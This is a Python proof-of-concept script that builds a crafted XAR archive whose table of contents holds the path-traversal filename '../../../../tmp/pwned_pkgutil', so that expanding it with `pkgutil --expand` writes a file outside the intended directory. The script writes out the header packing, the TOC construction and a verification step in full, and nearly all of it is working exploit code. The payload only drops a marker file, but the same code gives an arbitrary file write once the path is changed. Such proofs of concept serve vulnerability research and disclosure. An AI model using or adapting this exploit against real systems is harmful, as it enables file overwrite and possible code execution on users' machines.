#!/usr/bin/env python3
"""
Build a crafted XAR archive with a path-traversal filename.
When expanded via `pkgutil --expand`, the file is written outside
the intended destination directory.

XAR format:
  Header (28 bytes):
    magic          : 4 bytes  = 0x78617221 ('xar!')
    header_size    : 2 bytes  = 28
    version        : 2 bytes  = 1
    toc_length_compressed   : 8 bytes
    toc_length_uncompressed : 8 bytes
    cksum_alg      : 4 bytes  = 0 (none)

  TOC: zlib-compressed XML describing files
  Heap: raw file data

The malicious filename embedded in the TOC:  ../../../../tmp/pwned_pkgutil
"""

import struct, zlib, hashlib, sys

MALICIOUS_NAME = "../../../../tmp/pwned_pkgutil"
FILE_CONTENT    = b"pwned via pkgutil --expand path traversal\n"

# ── Build TOC XML ──────────────────────────────────────────────────────────
# size/offset refer to position in the heap (after the TOC)
heap_data   = FILE_CONTENT
file_size   = len(heap_data)
file_offset = 0  # first (and only) file starts at heap offset 0

toc_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<xar>
 <toc>
  <creation-time>2026-10-28T00:00:00</creation-time>
  <checksum style="none"/>
  <file id="1">
   <name>{MALICIOUS_NAME}</name>
   <type>file</type>
   <data>
    <offset>{file_offset}</offset>
    <size>{file_size}</size>
    <length>{file_size}</length>
    <encoding style="application/octet-stream"/>
   </data>
  </file>
 </toc>
</xar>
""".encode("utf-8")

toc_uncompressed_len = len(toc_xml)
toc_compressed       = zlib.compress(toc_xml)
toc_compressed_len   = len(toc_compressed)

# ── Build XAR header ───────────────────────────────────────────────────────
HEADER_SIZE = 28
header = struct.pack(
    ">IHHqqI",
    0x78617221,          # magic
    HEADER_SIZE,         # header_size
    1,                   # version
    toc_compressed_len,
    toc_uncompressed_len,
    0,                   # cksum_alg: none
)

assert len(header) == HEADER_SIZE

# ── Write archive ──────────────────────────────────────────────────────────
out_path = "poc.xar"
with open(out_path, "wb") as f:
    f.write(header)
    f.write(toc_compressed)
    f.write(heap_data)

print(f"Written: {out_path}  ({len(header) + len(toc_compressed) + len(heap_data)} bytes)")
print(f"Embedded filename: {MALICIOUS_NAME}")
print(f"Expected traversal target: /tmp/pwned_pkgutil")

# ── Verify structure ───────────────────────────────────────────────────────
data = open(out_path, "rb").read()
magic = struct.unpack(">I", data[:4])[0]
hdr_size = struct.unpack(">H", data[4:6])[0]
toc_clen, toc_ulen = struct.unpack(">qq", data[8:24])
print(f"\nVerification:")
print(f"  magic:         0x{magic:08x} {'OK' if magic == 0x78617221 else 'BAD'}")
print(f"  header_size:   {hdr_size}")
print(f"  toc compressed:   {toc_clen} bytes")
print(f"  toc uncompressed: {toc_ulen} bytes")
recovered_toc = zlib.decompress(data[hdr_size:hdr_size+toc_clen])
print(f"  TOC decompress: OK ({len(recovered_toc)} bytes)")
assert MALICIOUS_NAME.encode() in recovered_toc, "Malicious name not found in TOC!"
print(f"  Malicious name in TOC: YES")
